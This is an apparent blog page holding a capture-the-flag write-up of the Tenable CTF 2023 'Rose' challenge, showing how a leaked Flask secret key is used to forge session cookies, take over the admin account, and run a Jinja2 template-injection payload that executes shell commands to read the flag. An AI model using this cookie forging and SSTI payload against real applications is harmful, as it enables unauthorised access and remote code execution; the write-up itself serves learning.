@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Windows Kernel & Direct Syscalls</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-coy.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/styles/default.min.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body style="font-size: 17px;">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="index.html">Yazid's notes</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html">Home</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.html">About</a></li>                    
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!-- Page Header-->
+        <header class="masthead" style="background-image: url('assets/img/roses.png')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>Tenable CTF 2023: Rose (Write-up)</h1>
+                            <h2 class="subheading">Cookie Crafting + Admin Account Takeover & Server Side Template Injection on Flask.</h2>
+                            <span class="meta">
+                                Posted by
+                                <a href="#!">Yazid</a>
+                                on August 12, 2023
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Post Content-->
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                 
+                    <div style="display: flex; justify-content: center; align-items: center;">
+                        <img width="50%" src="https://www.tenable.com/themes/custom/tenable/img/23/capture-the-flag/ctf-logo-primary-nopad.png">
+                    </div>
+                    
+                    <p>
+                        This year's Tenable CTF was pretty cool, as it was my first time taking part, and even though I was a bit sick 🤧, my team and I managed to come <b>123rd out of 1187 teams 🥂</b>.
+                    </p>
+
+                    <p>One challenge that I really enjoyed (even though it was quite a headache) was <b>Rose</b>. This challenge demonstrates how it's possible to trigger a Remote Code Execution (RCE) in a vulnerable Flask template/application through session cookies forging. I liked this challenge because there wasn't too much guessing involved, but it was the closest one to a real scenario & it pushed me to understand the inner workings of certain Flask concepts.</p>
+
+                    <div style="display: flex; justify-content: center; align-items: center;">
+                        <img width="100%" src="assets/img/rose_challenge.png">
+                    </div>
+
+                    <p>The application presents a simple website with an identification portal, and we know that the signup option is not available, as it has been deactivated in the source code provided to us.</p>
+
+                    <div style="display: flex; justify-content: center; align-items: center;">
+                        <img width="100%" src="assets/img/rose_1.png">
+                    </div>
+
+                    <br><br>
+                    
+                    <div style="display: flex; justify-content: center; align-items: center;">
+                        <img width="100%" src="assets/img/rose_2.png">
+                    </div>
+
+                    <p>At this point it is clearly shown that we have to trigger an SSTI.</p>
+                    <pre><code>app = Flask(__name__)
+
+app.config['SECRET_KEY'] = 'SuperDuperSecureSecretKey1234!'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'
+
+db.init_app(app)</code></pre>
+                    <p>
+                        We also have the secret key in __init__.py, so we need to craft a session cookie encrypted with it.</p> 
+                    <p> As the name field is mandatory and must be in our cookie, we craft a first session cookie with this field only and observe the behavior, we should be redirected to /dashboard according to the following code:
+                    </p>
+
+                    <pre><code>@main.route('/')
+def index():
+    if("name" in session.keys()):
+        return redirect(url_for('main.dashboard'))
+    return render_template('index.html')</code></pre>
+
+                    <pre><code>
+└──╼ $flask-unsign --sign --cookie '{"name":"Yazidou", "logged_in": True}' --secret 'SuperDuperSecureSecretKey1234!'
+eyJuYW1lIjoiWWF6aWRvdSIsImxvZ2dlZF9pbiI6dHJ1ZX0.ZNTd1A.i7CP6O3nEXhUMwWPS8bsJ3r222c
+                    </code></pre>
+
+                    <p>
+                        It seems to work but you got a redirection loop which makes sense since / redirects to /dasboard and /dashboard needs the user to be authenticated, which is checked with @login_required, otherwise it redirects to / (main page).
+                    </p>
+
+                    <div style="display: flex; justify-content: center; align-items: center;">
+                        <img width="100%" src="assets/img/rose_3.png">
+                    </div>
+                    
+   
+
+                    <p>
+                        Infinite redirection causes that error messages passed as response cookies are concatenated into each other, which can be misleading. My first reflex was to try to bypass the redirection by forcing the 200 code or remove the 'Location' field from the HTTP header, but that was useless <i>(Did a lot of super useless things on that one 😹 but that's how we learn, folks)</i>.
+                    </p>
+
+                    <pre><code>yazid@Yazid:~$ flask-unsign --decode --cookie '.eJzt0zEOgCAQBMCvXLYmPoBX2BtjLngKCYLxsFDj3-UXNlRb7E65D6YlsnpR2OEBlRrYRJVXgUEfhVUo5pVCopKJnaslFR-U9rrpML6mueaa-82Npp74EPWwC0cVg8SbwOLiO8z5xPsBUtxLyQ.ZNTGCg.JNsw0hIOAv7c3g7mknarK0fiatQ'
+{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': False, 'name': 'yazidou'}
+                    </code></pre><br>
+
+
+                    <div style="display: flex; justify-content: center; align-items: center;">
+                        <img width="100%" src="assets/img/rose_4.png">
+                    </div>
+
+                    <p>Our cookie doesn't contain the information that the user is authenticated, so we need to figure out what <code>login_user()</code> does to fill this information. </p>
+
+                    <p>To achive that, I went through the source code of the <code>login_user()</code> function on the Flask documentation:</p>
+
+                    <pre><code style="font-size: 13px;">def login_user(user, remember=False, duration=None, force=False, fresh=True):
+    if not force and not user.is_active:
+        return False
+
+    user_id = getattr(user, current_app.login_manager.id_attribute)()
+    session["_user_id"] = user_id
+    session["_fresh"] = fresh
+    session["_id"] = current_app.login_manager._session_identifier_generator()
+
+    if remember:
+        session["_remember"] = "set"
+        if duration is not None:
+            try:
+                # equal to timedelta.total_seconds() but works with Python 2.6
+                session["_remember_seconds"] = (
+                    duration.microseconds
+                    + (duration.seconds + duration.days * 24 * 3600) * 10**6
+                ) / 10.0**6
+            except AttributeError as e:
+                raise Exception(
+                    f"duration must be a datetime.timedelta, instead got: {duration}"
+                ) from e
+
+    current_app.login_manager._update_request_context_with_user(user)
+    user_logged_in.send(current_app._get_current_object(), user=_get_user())
+    return True </code></pre>
+<p>
+    We can see that login_user fills some of the cookie fields, the most important of which are <b>_id, _user_id, _fresh</b>. The most crucial here is <b>_user_id</b>, which corresponds to the user's id in the application, and this is where the trap lies and where you need to think a little. You have to guess how many users there are in the site's database, since signup is deactivated, it should only be one which is the owner ? Let's craft fake values for the other fields set <b>_user_id</b> to 1 and fire up the cookie in the browser.
+</p>
+
+<pre><code>yazid@Yazid:~$ flask-unsign --sign --cookie '{"name":"Admin", "logged_in": True, "remember": True, "_id": "e349d4f5-213d-4b94-a71a-7b8723f5c281", "_user_id": 1}' --secret 'SuperDuperSecureSecretKey1234!'
+
+.eJw1zE0KgCAQQOG7zDoX_qF1k1aizSRCFlizKbp7EbR8i-9dsMZKMMAYz4IbM0MHy5YzYSgrDEdj6qBRpZqo_R0KvoS06dHMViipUZjUGxGdjMIl75Se7aS8fG-Bd2qfkPcD5xQiTg.ZNTRMg.i19tDrlZmDprWomgQTLsOIjCqwc
+</code></pre>
+<br>
+
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/rose_5.png">
+</div>
+
+<p>
+    Kaboom ! Got the owner's session. Let's know figure out how to read /home/ctf/flag.txt thourgh SSTI.
+</p>
+<p>
+    A little subtlety here is that the template uses the <code>render_template_string()</code> function to filter out certain characters.
+</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/rose_6.png">
+</div>
+
+<p>
+    This function will filter out certain characters such as... apostrophes. I spent about 5 hours trying to bypass this protection before realizing that all I had to do was replace the apostrophes with quotation marks 😹. But before I found myself doing crazy stuff like that:  
+</p>
+
+<pre><code>flask-unsign --sign --cookie '{"name":"{% autoescape false %}&ltp&gt{{7*'7'|safe}}&ltp&gt{% endautoescape %}","logged_in": True, "remember": True, "_id": "e349d4f5-213d-4b94-a71a-7b8723f5c281", "_user_id": 1}' --secret 'SuperDuperSecureSecretKey1234!'
+</code></pre>
+
+<p>Which actually worked and did not filtered the '7    ' when i tried 7*'7' by giving me 7777777 instead of 49 ! But that immediately broke down when I tried the RCE 😹.</p>
+
+<p>Anyway, here's the one that really worked for me: </p>
+
+<pre><code>flask-unsign --sign --cookie '{"name":"{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\"cat /home/ctf/flag.txt\").read() }}", "logged_in": True, "remember": True,"_id":"e349d4f5-213d-4b94-a71a-7b8723f5c281", "_user_id": 1}' --secret 'SuperDuperSecureSecretKey1234!'
+</code></pre>
+
+<p>The RCE payload comes from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">PayloadsAllTheThings/Server Side Template Injection</a>. </p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/rose_7.png">
+</div>
+
+<p>
+    Flagged ! 😸
+</p>
+
+<p><i>I'm still learning so if you have a comment or observation on this article, feel free to contact me, my email addresses are on my <a href="https://github.com/Xacone">Github profile</a> 😸</i></p>
+
+                    </div>
+                </div>
+            </div>
+        </article>
+        <!-- Footer-->
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <!--<li class="list-inline-item">
+                                <a href="#!">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="#!">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>-->
+                            <li class="list-inline-item">
+                                <a href="http://github.com/xacone">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="small text-center text-muted fst-italic">Copyright &copy; Yazid 2023</div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+    <script>
+        Prism.highlightAll();
+      </script>
+</html>
